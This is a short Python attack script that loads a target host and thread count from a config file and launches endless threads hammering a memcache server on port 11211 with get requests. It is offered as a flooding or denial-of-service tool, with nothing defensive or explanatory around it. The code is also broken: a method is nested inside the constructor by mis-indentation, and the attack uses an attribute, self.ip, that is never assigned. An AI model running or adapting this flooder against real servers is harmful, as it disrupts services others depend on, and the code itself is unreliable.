import memcache as memcache
import json
import threading
from colorama import init, Fore, Back, Style
from socket import *
import time
import os


NOTE = Fore.BLUE + "[NOTE] " + Fore.WHITE
INFO = Fore.MAGENTA + "[INFO] " + Fore.WHITE
WARN = Fore.YELLOW + "[WARN] " + Fore.WHITE
ERROR = Fore.RED + "[ERROR] " + Fore.WHITE

__location__ = os.path.realpath(
    os.path.join(os.getcwd(), os.path.dirname(__file__)))

class MemCache():

  def __init__(self):
    
    self.config_file = os.path.join(__location__, "attack_config.json")

    with open(self.config_file, 'r') as config_file:

      json_data = json.load(config_file)

      self.url = json_data['HOST']
      self.threading_count = json_data['THREADS']
      self.sleep_time = json_data['SLEEP']
      self.threads_num = self.threading_count

    def get_info(self):

      print(WARN + "\n")      
      print(f"url: {self.url}\nthreads: {self.threads_num}\nsleep: {self.sleep_time}")
    
  def attack(self):

    threads = []

    mem = memcache.Client([self.ip + ":11211"], debug=0)

    def begin():
        while True:  
            mem.get('key')
            if self.sleep_time:
                time.sleep(self.sleep_time)

    for i in range(self.threading_count):
      thread = threading.Thread(target=begin)
      thread.start()
      threads.append(thread)

    for t in threads:
            t.join()